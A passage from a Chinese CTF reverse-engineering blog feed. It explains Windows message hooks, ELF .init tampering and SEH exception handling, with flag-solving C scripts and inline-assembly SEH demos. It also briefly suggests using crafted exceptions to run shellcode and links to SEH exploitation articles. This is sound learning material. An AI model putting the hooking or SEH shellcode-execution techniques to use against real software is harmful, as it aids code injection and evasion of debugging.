title="爆破脚本"></a>爆破脚本</h3><p>这里要按位与上0xffff，因为这里最后只赋值了最后十六位，所以需要使用&amp;0xffff来限制位数，保证取到最后的十六位</p><p>有时候还存在左移溢出的问题：</p><p><a href="https://blog.csdn.net/u013658041/article/details/78116449">https://blog.csdn.net/u013658041/article/details/78116449</a></p><p><img src="/2022/02/03/ELF%E6%96%87%E4%BB%B6%E6%89%8B%E8%84%B1upx%E5%8F%98%E5%BD%A2%E5%A3%B3/1644069404698.png"></p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt; #include &lt;string.h&gt;#include &lt;stdlib.h&gt;int main(){int s[]={0x8d68,0x9d49,0x2a12,0xab1a,0xcbdc,0xb92b,0x2e32,0x9f59,0xddcd,0x9d49,0xa90a,0xe70,0xf5cf,0x5ed5,0x3c03,0x7c87,0x2672,0xab1a,0xa50,0x5af5,0xff9f,0x9f59,0xbd0b,0x58e5,0x3823,0xbf1b,0x78a7,0xab1a,0x48c4,0xa90a,0x2c22,0x9f59,0x5cc5,0x5ed5,0x78a7,0x2672,0x5695};for(int i=0;i&lt;40;++i){for(int j=32;j&lt;=127;++j){int temp=(j&lt;&lt;8)&amp;0xffff;for(int  k=0;k&lt;8;++k){if((temp&amp;0x8000)!=0){temp=((2*temp)^0x1021)&amp;0xffff;}elsetemp=(2*temp)&amp;0xffff;}if(temp==s[i]){printf("%c",j);}}}return 0;}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hook</title>
      <link href="/2022/02/03/Hook/"/>
      <url>/2022/02/03/Hook/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-Windows消息机制"><a href="#0x00-Windows消息机制" class="headerlink" title="0x00-Windows消息机制"></a>0x00-Windows消息机制</h1><h2 id="消息的产生"><a href="#消息的产生" class="headerlink" title="消息的产生"></a>消息的产生</h2><p>通常根据消息产生的方式分为 硬件和软件信息。</p><p>硬件信息：常指由硬件装置所产生的时间（如鼠标或键盘被按下），放在系统消息队列（System Queue）中，再由系统消息处理机构将消息发送至应用程序消息队列中。</p><p>软件信息：常指由WIndows系统或其它应用程序发送的信息，他直接放入应用程序消息队列中，再由应用程序消息处理机构将消息传递给相应的窗口。</p><h2 id="消息的组成"><a href="#消息的组成" class="headerlink" title="消息的组成"></a>消息的组成</h2><p>一个消息由一个消息名称（UINT），和两个参数（WPARAM,LPARAM）。当用户进行了输入或者窗口的状态发生改变时系统都会发送消息到某一个窗口。例如当菜单中转之后会有WM_COMMAND消息发送，WPARAM的高字中(HIWORD(WPARAM))是命令的ID号，对菜单来讲就是菜单的ID。当然用户也可以定义自己的消息名称，也可以利用自定义消息来发送通知和传送数据</p><h2 id="消息的接收者"><a href="#消息的接收者" class="headerlink" title="消息的接收者"></a>消息的接收者</h2><p>一个消息必须由一个窗口接收。在窗口过程（WNDPROC）中可以对消息进行分析，对应用程序要求处理的消息进行相应的处理工作，对于那些不需要应用程序处理的消息可以简单的调用缺省处理。例如你希望对菜单选择进行处理，那么你可以定义对WM_COMMAND进行处理的代码，如果希望在窗口中进行图形输出就必须对WM_PAINT进行处理</p><h2 id="消息的处理"><a href="#消息的处理" class="headerlink" title="消息的处理"></a>消息的处理</h2><p>窗口接收到发送给自己的消息后，将消息结构作为参数，调用窗口过程对消息进行相应的处理。可以将窗口过程看作消息处理代码的集合，窗口过程函数的原型为</p><blockquote><p> long FAR PASCAL WndProc(HWND hWnd,WORD message,WORD wParam,LONG lParam);<br>  其中，hWnd为窗口句柄，message为消息名称，wParam,lParam为两个参数。 </p></blockquote><p>在Windows中，应用程序不直接调用任何窗口函数，而是等待Windows调用函数窗口，请求完成任务或返回信息。</p><p>为保证Windows调用这个窗口函数，这个函数必须先向Windows登记，然后在Windows实施操作时回调，所以窗口函数又被称为回调函数。WndProc是一个主回调函数，Windows至少有一个回调函数。他是在应用程序进行窗口类注册时向Windows登记的。</p><h1 id="0x01-HOOK"><a href="#0x01-HOOK" class="headerlink" title="0x01-HOOK"></a>0x01-HOOK</h1><p> <img src="/2022/02/03/Hook/20180613200129100"> </p><blockquote><p> 钩子是Windows消息处理机制的一个平台，应用程序可以在上面设置子程以监视指定窗口的某种消息，而且所监视的窗口可以是其他进程所创建的。</p><p>当消息到达后，钩子可以在目标窗口处理函数之前处理它并且可以阻止消息的传递。</p><p>每一个钩子都有一个与之相关联的指针列表，称之为钩子链表，该链表中的指针指向这个钩子的各个处理子程。钩子的种类很多，每种钩子可以拦截并处理相应种类的消息。</p><p>当钩子所监视的消息出现时，Windows调用链表中的第一个钩子子程，第一个过程完成后将消息传递链表中的下一个钩子子程，直至链表中所有钩子子程都执行完成（注意：如果在其中有一个钩子在执行完成前不执行消息传递，其后面的钩子过程和原窗口过程都不会再接收到消息。）后将消息返回给窗口过程。 </p></blockquote><h2 id="钩子子程函数"><a href="#钩子子程函数" class="headerlink" title="钩子子程函数"></a>钩子子程函数</h2><p>钩子子程是一个应用程序定义的回调函数。用以监听系统或者某一类特定类型的事件，这些事件可以是与某一特定线程相关联的，也可以是系统中所有线程的事件。其函数原型为</p><blockquote><p> LRESULT CALLBACK HookProc  ( int nCode, WPARAM wParam, LPARAM lParam ); </p></blockquote><p>其中，nCode参数是Hook代码，Hook子程使用这个来确定任务。这个参数的值依赖于Hook类型，每一种Hook都有自己的Hook代码特征字符集。Windows系统提供了多种类型的钩子，每一种类型的Hook可以使应用程序能够监听不同类型的系统消息处理机制。</p><p>WPARAM和PARAM参数的值依赖于Hook代码，但它们的典型值是包含了关于发送或者接受消息的信息。</p><h2 id="钩子的安装与卸载"><a href="#钩子的安装与卸载" class="headerlink" title="钩子的安装与卸载"></a>钩子的安装与卸载</h2><p>钩子的安装是通过 SDK API函数SetWindowsHookEx()来实现的，它将钩子子程安装到系统钩子链表中</p><p>其函数原型为</p><blockquote><p>  HHOOK SetWindowsHookEx( int idHook,HOOKPROC lpfn,HINSTANCE hMod, DWORD dwThreadId ); </p></blockquote><p>其中，idHook是指钩子的类型</p><p><img src="/2022/02/03/Hook/1649502050125.png"></p><blockquote><p>lpfn是指钩子子程的地址指针。如果dwThreadId参数为0 或是一个由别的进程创建的线程的标识，lpfn必 须指向DLL中的钩子子程。除此以外，lpfn可以指向当前进程的一段钩子子程代码。 </p><p> hMod是指应用程序实例的句柄。标识包含lpfn所指的子程的DLL。如果dwThreadId 标识当前进程创建的一个线程，而且子程代码位于当前进程，hMod必须为NULL。 </p><p>dwThreadId是指与安装的钩子子程相关联的线程的标识符，如果为0，钩子子程与所有的线程关联。</p><p>函数成功则返回钩子的句柄，失败返回NULL。</p></blockquote><p>钩子在在使用完之后需要使用UnHookWindowsHookEx()卸载 </p><blockquote><p> UnHookWindowsHookEx ( HHOOK hhk ) </p></blockquote><p>参数hhk是etWindowsHookEx()函数返回钩子句柄，函数成功返回TRUE，否则返回FALSE </p><h1 id="题目-BUUCTF-easystrcmp"><a href="#题目-BUUCTF-easystrcmp" class="headerlink" title="题目-BUUCTF-easystrcmp"></a>题目-BUUCTF-easystrcmp</h1><p>进入主函数</p><p><img src="/2022/02/03/Hook/1643884712406.png"></p><p>看似是一个简单的比较，但是输入之后发现并不对</p><p>应该是做了什么处理，动态调试</p><p>点进strcmp函数</p><p><img src="/2022/02/03/Hook/1643884961802.png"></p><p>发现跳转到了加密函数</p><p>原理分析</p><p>因为存在init段，去查看函数</p><p><img src="/2022/02/03/Hook/1643885017644.png"></p><p>这样可以查看函数列表进行跳转</p><p><img src="/2022/02/03/Hook/1643885047181.png"></p><p>进入off函数</p><p><img src="/2022/02/03/Hook/1643885073169.png"></p><p>第一个函数点进去没发现什么，第二个函数点进去</p><p><img src="/2022/02/03/Hook/1643885101701.png"></p><p>可以看到先把strcmp函数的地址赋值给qword_201090</p><p>然后把sub_6EA函数赋值给off-102028,点进去</p><p><img src="/2022/02/03/Hook/1643885199097.png"></p><p>发现正好是strcmp的地址，所以真正运行起来，函数会跳转到sub_6EA函数中，而不是strcmp函数，这样就实现了一个简单的hook</p><p>脚本</p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;#include &lt;string.h&gt;int main(){char flag[]="********CENSORED********";char s[]={0x42, 0x09,   0x4A, 0x49, 0x35, 0x43, 0x0A, 0x41, 0xF0, 0x19, 0xE6, 0x0B,   0xF5, 0xF2, 0x0E, 0x0B, 0x2B, 0x28, 0x35, 0x4A, 0x06, 0x3A,   0x0A, 0x4F};  for(int i=0;i&lt;strlen(flag);++i)  {  flag[i]+=s[i];  }  printf("%s",flag);return 0; } </code></pre><p><a href="https://www.cnblogs.com/iBinary/p/7599789.html%E5%85%B7%E4%BD%93%E8%AE%B2%E8%A7%A3%E4%BB%80%E4%B9%88%E6%98%AFHook">https://www.cnblogs.com/iBinary/p/7599789.html具体讲解什么是Hook</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Init初始化</title>
      <link href="/2022/02/03/Init%E5%88%9D%E5%A7%8B%E5%8C%96/"/>
      <url>/2022/02/03/Init%E5%88%9D%E5%A7%8B%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="ELF文件结构"><a href="#ELF文件结构" class="headerlink" title="ELF文件结构"></a>ELF文件结构</h1><p><a href="https://carrychen.website/2021/05/14/elf-format/">https://carrychen.website/2021/05/14/elf-format/</a></p><p> .init节定义了一个_init函数，用于可执行目标文件开始时的初始化工作。当进入主程序之前，系统先执行.init节的指令代码初始化 </p><h1 id="例题-hgame2022-week2-fakeshell"><a href="#例题-hgame2022-week2-fakeshell" class="headerlink" title="例题-hgame2022-week2-fakeshell"></a>例题-hgame2022-week2-fakeshell</h1><p>先去看看init段进行了什么处理</p><p><img src="/2022/02/03/Init%E5%88%9D%E5%A7%8B%E5%8C%96/1643870839069.png"></p><p><img src="/2022/02/03/Init%E5%88%9D%E5%A7%8B%E5%8C%96/1643870867197.png"></p><p><img src="/2022/02/03/Init%E5%88%9D%E5%A7%8B%E5%8C%96/1643870876729.png"></p><p>在第二个函数发现了处理</p><p><img src="/2022/02/03/Init%E5%88%9D%E5%A7%8B%E5%8C%96/1643870922345.png"></p><p>查看aHappyh4me交叉引用</p><p><img src="/2022/02/03/Init%E5%88%9D%E5%A7%8B%E5%8C%96/1643870957940.png"></p><p>可以看到后面还有操作</p><p>定位到加密函数</p><p><img src="/2022/02/03/Init%E5%88%9D%E5%A7%8B%E5%8C%96/1643870991851.png"></p><p><img src="/2022/02/03/Init%E5%88%9D%E5%A7%8B%E5%8C%96/1643871002931.png"></p><p>可以知道是rc4加密，密钥在init段被修改了</p><p>写脚本，也可以使用工具CaptfEncoder-win-1.1.0</p><p>得到flag</p><p><img src="/2022/02/03/Init%E5%88%9D%E5%A7%8B%E5%8C%96/1643871135186.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEH原理和例题</title>
      <link href="/2022/02/03/SEH%E5%8E%9F%E7%90%86%E5%92%8C%E4%BE%8B%E9%A2%98/"/>
      <url>/2022/02/03/SEH%E5%8E%9F%E7%90%86%E5%92%8C%E4%BE%8B%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="WINDOWS下的异常处理"><a href="#WINDOWS下的异常处理" class="headerlink" title="WINDOWS下的异常处理"></a>WINDOWS下的异常处理</h1><h2 id="异常列表"><a href="#异常列表" class="headerlink" title="异常列表"></a>异常列表</h2><p><img src="/2022/02/03/SEH%E5%8E%9F%E7%90%86%E5%92%8C%E4%BE%8B%E9%A2%98/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220203125855.jpg"></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.cnblogs.com/Sna1lGo/p/14732048.html#:~:text=Windows%E4%B8%AD,%E5%88%99%E7%9B%B4%E6%8E%A5%E7%A8%8B%E5%BA%8F%E5%B4%A9%E6%BA%83%E3%80%82">https://www.cnblogs.com/Sna1lGo/p/14732048.html#:~:text=Windows%E4%B8%AD,%E5%88%99%E7%9B%B4%E6%8E%A5%E7%A8%8B%E5%BA%8F%E5%B4%A9%E6%BA%83%E3%80%82</a></p><p><a href="https://bbs.pediy.com/thread-249592.htm">https://bbs.pediy.com/thread-249592.htm</a></p><h1 id="SEH"><a href="#SEH" class="headerlink" title="SEH"></a>SEH</h1><h2 id="SEH介绍"><a href="#SEH介绍" class="headerlink" title="SEH介绍"></a>SEH介绍</h2><p> SEH(Structured Exception Handling)结构化异常处理,是windows操作系统默认的错误处理机制，它允许我们在程序产所错误时使用特定的异常处理函数处理这个异常，尽管提供的功能预取为处理异常，但由于其功能的特点，也往往大量用于反调试。 </p><h2 id="重要成员介绍"><a href="#重要成员介绍" class="headerlink" title="重要成员介绍"></a>重要成员介绍</h2><h3 id="1、异常处理函数"><a href="#1、异常处理函数" class="headerlink" title="1、异常处理函数"></a>1、异常处理函数</h3><pre class="language-c" data-language="c"><code class="language-c">EXCEPTION_DISPOSITION __cdecl _except_handler(     struct _EXCEPTION_RECORD *ExceptionRecord,     void * EstablisherFrame,     struct _CONTEXT *ContextRecord,     void * DispatcherContext     );</code></pre><p>第一个参数指向结构体EXCEPTION_RECORD </p><h4 id="操作系统常见异常"><a href="#操作系统常见异常" class="headerlink" title="操作系统常见异常"></a>操作系统常见异常</h4><pre class="language-c" data-language="c"><code class="language-c">EXCEPTION_ACCESS_VIOLATION     0xC0000005     程序企图读写一个不可访问的地址时引发的异常。例如企图读取0地址处的内存。EXCEPTION_ARRAY_BOUNDS_EXCEEDED    0xC000008C     数组访问越界时引发的异常。EXCEPTION_BREAKPOINT                           0x80000003     触发断点时引发的异常。EXCEPTION_DATATYPE_MISALIGNMENT    0x80000002     程序读取一个未经对齐的数据时引发的异常。EXCEPTION_FLT_DENORMAL_OPERAND     0xC000008D     如果浮点数操作的操作数是非正常的，则引发该异常。所谓非正常，即它的值太小以至于不能用标准格式表示出来。EXCEPTION_FLT_DIVIDE_BY_ZERO                   0xC000008E     浮点数除法的除数是0时引发该异常。EXCEPTION_FLT_INEXACT_RESULT           0xC000008F     浮点数操作的结果不能精确表示成小数时引发该异常。EXCEPTION_FLT_INVALID_OPERATION            0xC0000090     该异常表示不包括在这个表内的其它浮点数异常。EXCEPTION_FLT_OVERFLOW                             0xC0000091     浮点数的指数超过所能表示的最大值时引发该异常。EXCEPTION_FLT_STACK_CHECK                  0xC0000092     进行浮点数运算时栈发生溢出或下溢时引发该异常。EXCEPTION_FLT_UNDERFLOW                    0xC0000093     浮点数的指数小于所能表示的最小值时引发该异常。EXCEPTION_ILLEGAL_INSTRUCTION          0xC000001D     程序企图执行一个无效的指令时引发该异常。EXCEPTION_IN_PAGE_ERROR                        0xC0000006     程序要访问的内存页不在物理内存中时引发的异常。EXCEPTION_INT_DIVIDE_BY_ZERO                   0xC0000094     整数除法的除数是0时引发该异常。EXCEPTION_INT_OVERFLOW                             0xC0000095     整数操作的结果溢出时引发该异常。EXCEPTION_INVALID_DISPOSITION                  0xC0000026     异常处理器返回一个无效的处理的时引发该异常。EXCEPTION_NONCONTINUABLE_EXCEPTION     0xC0000025     发生一个不可继续执行的异常时，如果程序继续执行，则会引发该异常。EXCEPTION_PRIV_INSTRUCTION                     0xC0000096     程序企图执行一条当前CPU模式不允许的指令时引发该异常。EXCEPTION_SINGLE_STEP                          0x80000004     标志寄存器的TF位为1时，每执行一条指令就会引发该异常。主要用于单步调试。EXCEPTION_STACK_OVERFLOW                   0xC00000FD     栈溢出时引发该异常。</code></pre><p>异常回调函数_except_handler的第二个参数是一个指向establisher frame结构体的指针，这是SEH中一个很重要的参数，但是现在暂时忽略。</p><p>第三个参数是一个指向结构体CONTEXT的指针，CONTEXT结构体定义在WINNT.H里，它代表了特定线程的注册值。当用在SEH时，CONTEXT就表示异常发生时的注册值。顺带说一句，这个CONTEXT结构体与GetThreadContext和SetThreadContext所使用的结构体是同一个。</p><p>第四个参数DispatcherContext也可以暂时忽略。</p><h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>根据不同的返回值，确定是否处理</p><pre class="language-c" data-language="c"><code class="language-c">4种返回值及含义   1.ExceptionContinueExecution(0)：回调函数处理了异常，可以从异常发生的指令处重新执行。   2.ExceptionContinueSearch(1)：回调函数不能处理该异常，需要要SEH链中的其他回调函数处理。   3.ExceptionNestedException(2)：回调函数在执行中又发生了新的异常，即发生了嵌套异常   4.ExceptionCollidedUnwind(3)：发生了嵌套的展开操作</code></pre><h4 id="CONTEXT结构体"><a href="#CONTEXT结构体" class="headerlink" title="CONTEXT结构体"></a>CONTEXT结构体</h4><pre class="language-c" data-language="c"><code class="language-c">typedef struct _CONTEXT {     DWORD ContextFlags;     DWORD   Dr0;     DWORD   Dr1;     DWORD   Dr2;     DWORD   Dr3;     DWORD   Dr6;     DWORD   Dr7;     FLOATING_SAVE_AREA FloatSave;     DWORD   SegGs;     DWORD   SegFs;     DWORD   SegEs;     DWORD   SegDs;     DWORD   Edi;     DWORD   Esi;     DWORD   Ebx;     DWORD   Edx;     DWORD   Ecx;     DWORD   Eax;     DWORD   Ebp;     DWORD   Eip;     DWORD   SegCs;     DWORD   EFlags;     DWORD   Esp;     DWORD   SegSs; } CONTEXT;</code></pre><h3 id="2-、结构体EXCEPTION-RECORD"><a href="#2-、结构体EXCEPTION-RECORD" class="headerlink" title="2 、结构体EXCEPTION_RECORD"></a>2 、结构体EXCEPTION_RECORD</h3><pre class="language-c" data-language="c"><code class="language-c">typedef struct _EXCEPTION_RECORD { DWORD ExceptionCode; DWORD ExceptionFlags; struct _EXCEPTION_RECORD *ExceptionRecord; PVOID ExceptionAddress; DWORD NumberParameters; DWORD ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS]; }  EXCEPTION_RECORD;</code></pre><p>第一个参数ExceptionCode是一个由操作系统分配给异常的数值，在WINNT.H里用#define定义了一系列的由STATUS_为前缀的异常代码，比如STATUS_ACCESS_VIOLATION 的异常代码是 0xC0000005，我们可以从Windows NT DDK的头文件NTSTATUS.H中找到更加完备的异常代码。可以理解为异常的类型<br>第四个参数ExceptionAddress异常发生的地址。<br>其他的参数可以暂时忽略。</p><h3 id="3-、EXCEPTION-REGISTRATION"><a href="#3-、EXCEPTION-REGISTRATION" class="headerlink" title="3 、EXCEPTION_REGISTRATION"></a>3 、EXCEPTION_REGISTRATION</h3><pre class="language-c" data-language="c"><code class="language-c">EXCEPTION_REGISTRATION struc     prev    dd      ?     handler dd      ? _EXCEPTION_REGISTRATION ends</code></pre><p>SEH是一个链表，而这个结构存储每个结点的信息，第一个成员指向下一个结点的handler，第二个成员handler指向处理异常的函数，每次添加一个异常就会添加在SEH链表的头结点位置，也就是头插法</p><p>那么程序是怎么找到这个链表的呢</p><blockquote><p> <strong>线程信息块的第一个DWORD（在基于Intel CPU的机器上是FS:[0]）指向这个链表的头部。</strong> </p></blockquote><h3 id="5、线程信息块TIB-TEB"><a href="#5、线程信息块TIB-TEB" class="headerlink" title="5、线程信息块TIB/TEB"></a>5、线程信息块TIB/TEB</h3><pre class="language-c" data-language="c"><code class="language-c">typedef struct _NT_TIB {     struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; //异常的链表     PVOID StackBase;     PVOID StackLimit;     PVOID SubSystemTib;     union {         PVOID FiberData;         DWORD Version;     };      PVOID ArbitraryUserPointer;     struct _NT_TIB *Self;} NT_TIB;</code></pre><h2 id="结构图"><a href="#结构图" class="headerlink" title="结构图"></a>结构图</h2><p><img src="/2022/02/03/SEH%E5%8E%9F%E7%90%86%E5%92%8C%E4%BE%8B%E9%A2%98/1648189897008.png" alt="重要成员结构图"></p><h2 id="异常处理流程"><a href="#异常处理流程" class="headerlink" title="异常处理流程"></a>异常处理流程</h2><p>当异常出现时，程序先判断是否处于调试状态，如果处于调试状态，那么就会向调试器发送EXCEPTION_DEBUG_EVENT事件。当异常抛给调试器后，调试器有两种选择</p><p>1 修改触发异常的代码继续执行（程序会停在触发异常的代码处，导致异常的代码无法执行）</p><p>2 忽略异常交给SEH执行</p><p>这里假如选择第二种，那么 系统检查异常所处的线程并在这个线程环境中查看fs:[0]来确定是否安装SEH异常处理回调函数，如果有则调用它</p><blockquote><p>异常处理函数执行</p><p>(1）回调函数尝试处理这个异常，如果可以正确处理的话，则修正错误并将返回值设置为ExceptionContinueExecution，这时系统将结束整个查找过程。</p><p>（2）如果回调函数返回ExceptionContinueSearch，相当于告诉系统它无法处理这个异常，系统将根据SEH链中的prev字段得到前一个回调函数地址并重复步骤1，直至链中的某个回调函数返回ExceptionContinueExection为止，查找结束。</p></blockquote><p>如果调试器还是不去处理这个异常或进程没有被调试，那么系统检查有没有Final型的异常处理回调函数（也就是C语言中的__finally），如果有，就去调用它，当这个回调函数返回时，系统会根据这个函数的返回值做相应的动作。</p><blockquote><p>从这里我们也可以看到__finally的代码是一定会执行的</p></blockquote><p>如果没有安装Final型回调函数，系统直接调用默认的异常处理程序终止进程。</p><h3 id="堆栈展开"><a href="#堆栈展开" class="headerlink" title="堆栈展开"></a>堆栈展开</h3><p>（1）什么是展开操作</p><p>①当发生异常时，系统遍历EXCEPTION_REGISTRATION结构链表，从链表头，直到它找到一个处理这个异常的处理程序。一旦找到，系统就再次重新遍历这个链表，直到处理这个异常的节点为止（即返回ExceptionContinueExecution的节点）。在这第二次遍历中，系统将再次调用每个异常处理函数。关键的区别是，在第二次调用中，异常标志被设置为2。这个值被定义为EH_UNWINDING</p><p>②注意展开操作是发生在出现异常时，这个异常回调函数拒绝处理的时候（即返回ExceptionContinueSearch）。这里系统会从链表头开始遍历（因异常的嵌套，可理解为由内层向外层，也就是多层的__try和except函数时，先从内部开始，然后往外），所以各异常回调函数会第1次被依次调用，直到找到同意处理的节点。然后，再重新从链表头开始（即由内向外）第2次调用以前那些曾经不处理异常的节点，直到同意处理的那个异常的节点为止。</p><p> ③ 当异常被处理后，即异常代码执行完毕后，程序恢复的位置由处理该异常的函数决定。即，当异常已经被处理完毕，并且所有前面的异常帧都已经被展开之后，流程从处理异常的那个回调函数决定的地方开始继续执行。</p><p>④展开操作完成后，同意处理异常的回调函数也必须负责把Fs:[0]恢复到处理这个异常的EXCEPTION_REGISTRATION上，即展开操作导致堆栈上处理异常的帧以下的堆栈区域上的所有内容都被移除，这个异常处理也就成了SEH链表的第1个节点。这样下次遇到异常时还能保证从内层到外层寻找的流程。</p><h2 id="异常处理的实现"><a href="#异常处理的实现" class="headerlink" title="异常处理的实现"></a>异常处理的实现</h2><h3 id="1、-try、except和finally"><a href="#1、-try、except和finally" class="headerlink" title="1、__try、except和finally"></a>1、__try、except和finally</h3><p> Visual C++中的__try{}/__finally{}和__try{}/__except{}结构本质上是对Windows提供的SEH的封装。 </p><p>try函数必须且只能跟着一个except或者一个finally，</p><p> 当try块中的代码发生异常时，__except()中的过滤程序就被调用。 </p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;Windows.h&gt;int handle(){printf("handling\n");return 1;}int main(){__try{__try{int x = 0;int y = x / x;//构造一个除0异常，交由handle进行处理}__finally{printf("111\n");//无论是否处理成功，都会执行}}__except (handle())//当返回值为-1，表示返回到原来的地方重新执行，0的话表示异常处理失败，1则为成功{printf("222\n");}return 0;}</code></pre><p><img src="/2022/02/03/SEH%E5%8E%9F%E7%90%86%E5%92%8C%E4%BE%8B%E9%A2%98/1648191644943.png" alt="执行结果"></p><p>这里我们构造了一个除零异常，遇到异常后抛给except的处理函数，返回1（EXCEPTION_EXECUTE_HANDLER）表示处理完成，然后再回来执行finally的代码，但是返回值改为-1的话，他会继续回到出现异常的地方，然后执行，那么就会一直在异常处理进行</p><p><img src="/2022/02/03/SEH%E5%8E%9F%E7%90%86%E5%92%8C%E4%BE%8B%E9%A2%98/1648191945865.png" alt="返回值为-1"></p><p>返回值为EXCEPTION_CONTINUE_SEARCH(0)时，会往外层找，因为我们这里就只有一个except，所以无法往外找，所以我们修改一下代码</p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;Windows.h&gt;int handle1(){printf("成功解决\n");return EXCEPTION_EXECUTE_HANDLER;}int handle(){printf("未被解决\n");return EXCEPTION_CONTINUE_SEARCH;}int main(){__try{__try{int x = 0;int y = x / x;//构造一个除0异常，交由handle进行处理}__except(handle()){}}__except (handle1())//当返回值为-1，表示返回到原来的地方继续执行，0的话表示异常处理失败，1则为成功{printf("222\n");}return 0;}</code></pre><p>这里我们嵌套了两层except，从内往外执行，因为内层的无法处理，即返回0，那么就往外找处理异常的函数</p><p><img src="/2022/02/03/SEH%E5%8E%9F%E7%90%86%E5%92%8C%E4%BE%8B%E9%A2%98/1648192362391.png" alt="执行结果"></p><p>ida中的效果</p><p><img src="/2022/02/03/SEH%E5%8E%9F%E7%90%86%E5%92%8C%E4%BE%8B%E9%A2%98/1648192718040.png"></p><p>可以看到ida会自动加注释</p><h3 id="2、插入汇编代码构造"><a href="#2、插入汇编代码构造" class="headerlink" title="2、插入汇编代码构造"></a>2、插入汇编代码构造</h3><p>我们下面插入汇编来创建一个异常的结构体</p><pre class="language-c" data-language="c"><code class="language-c">#define WIN32_LEAN_AND_MEAN#include &lt;windows.h&gt;#include &lt;stdio.h&gt;DWORD  scratch;EXCEPTION_DISPOSITION__cdecl_except_handler(    struct _EXCEPTION_RECORD* ExceptionRecord,    void* EstablisherFrame,    struct _CONTEXT* ContextRecord,    void* DispatcherContext){    unsigned i;    printf("Hello from an exception handler\n");    ContextRecord-&gt;Eax = (DWORD)&amp;scratch;//处理异常，将eax的值改为全局变量的地址    return ExceptionContinueExecution;}int main(){    DWORD handler = (DWORD)_except_handler;    __asm    {                                   push    handler        //将我们的异常处理函数压入栈中        push    FS : [0]       //将原本的SEH链压入栈，这样就构造了新的EXCEPTION_REGISTRATION        mov     FS : [0] , ESP     //将当前线程信息块TIB的第一个DWORD放入新的EXCEPTION_REGISTRATION    }    __asm    {        mov     eax, 0  //构造访问异常                mov[eax], 1           }    printf("After writing!\n");    __asm    {                                  mov     eax, [ESP]               mov     FS : [0] , EAX     //还原为原来的SEH链        add     esp, 8          //从栈中弹出新的EXCEPTION_REGISTRATION    }    return 0;}</code></pre><p><img src="/2022/02/03/SEH%E5%8E%9F%E7%90%86%E5%92%8C%E4%BE%8B%E9%A2%98/1648195113558.png" alt="堆栈图"></p><p>也就是先将我们处理异常的函数压入栈中，再把SEH链的头节点压入栈，这时候把ESP的值赋给FS:[0]也就是让SEH链指向这里，SEH链第一个节点（两个参数）第一个存储的就是原来链的地址，第二个是我们的处理函数，那么处理异常的时候，就会先让我们的异常处理函数执行，最后将ESP地址存储的值还给FS:[0]，也就是还原SEH链，add esp,8还原堆栈</p><p>别人的另一种实现</p><pre class="language-c" data-language="c"><code class="language-c">//1.挂入链表相当于这部分//fs[0]-&gt; Exception_asm{mov eax, fs:[0]mov temp,eaxlea ecx,Exceptionmov fs:[0],ecx}//为SEH成员赋值Exception.Next = (_EXCEPTION*)temp;Exception.Handler = (DWORD)&amp;MyEexception_handler;//下面是2，3EXCEPTION_DISPOSITION _cdecl MyEexception_handler(struct _EXCEPTION_RECORD *ExceptionRecord,//异常结构体PVOID EstablisherFrame,//SEH结构体地址struct _CONTEXT *ContextRecord,//存储异常发生时的各种寄存器的值 栈位置等PVOID DispatcherContext){if (ExceptionRecord-&gt;ExceptionCode == 0xC0000094)//2.异常过滤{ContextRecord-&gt;Eip = ContextRecord-&gt;Eip + 2;//3.异常处理ContextRecord-&gt;Ecx = 100;return ExceptionContinueExecution;}return ExceptionContinueSearch;}</code></pre><h2 id="参考文章-1"><a href="#参考文章-1" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.cnblogs.com/yilang/p/11238201.html">https://www.cnblogs.com/yilang/p/11238201.html</a></p><p><a href="https://www.cnblogs.com/DeeLMind/p/6866239.html">https://www.cnblogs.com/DeeLMind/p/6866239.html</a></p><p><a href="https://www.cnblogs.com/salomon/archive/2012/06/20/2556134.html">https://www.cnblogs.com/salomon/archive/2012/06/20/2556134.html</a></p><p><a href="https://bbs.pediy.com/thread-249592.htm">https://bbs.pediy.com/thread-249592.htm</a></p><h2 id="SEH利用"><a href="#SEH利用" class="headerlink" title="SEH利用"></a>SEH利用</h2><p><a href="https://idiotc4t.com/code-and-dll-process-injection/seh-code-execute">https://idiotc4t.com/code-and-dll-process-injection/seh-code-execute</a></p><p><a href="https://introspelliam.github.io/2017/06/29/0day/windows-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">https://introspelliam.github.io/2017/06/29/0day/windows-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</a></p><p><a href="https://bbs.pediy.com/thread-268036.htm">https://bbs.pediy.com/thread-268036.htm</a></p><p><a href="https://bbs.pediy.com/thread-140970.htm">https://bbs.pediy.com/thread-140970.htm</a></p><p>简单利用</p><p>我们可以自己构造异常，然后先处理掉异常，再执行我们的shellcode</p><h2 id="题目——hagme2022——week2——creakme2"><a href="#题目——hagme2022——week2——creakme2" class="headerlink" title="题目——hagme2022——week2——creakme2"></a>题目——hagme2022——week2——creakme2</h2><p>在静态分析中，只找到了tea加密算法，直接写脚本解不出来，去查看汇编代码（因为有时候ida没办法识别出一些汇编）</p><p><img 